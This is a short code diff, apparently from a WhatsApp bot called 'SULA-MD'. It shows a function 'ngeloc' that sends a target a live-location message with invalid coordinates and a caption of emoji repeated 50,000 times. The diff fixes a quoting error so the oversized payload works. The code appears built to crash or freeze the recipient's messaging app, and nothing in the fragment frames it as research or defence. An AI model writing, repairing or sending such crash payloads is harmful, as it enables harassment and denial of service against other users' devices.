@@ -26,7 +26,7 @@ async function ngeloc(target, quoted) {
             "liveLocationMessage": {
                 "degreesLatitude": "p", 
                 "degreesLongitude": "p", 
-                "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "😅😅😅😅😅.repeat(50000),
+                "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "😅😅😅😅😅".repeat(50000),
                 "sequenceNumber": "0",
                 "jpegThumbnail": "" 
             }
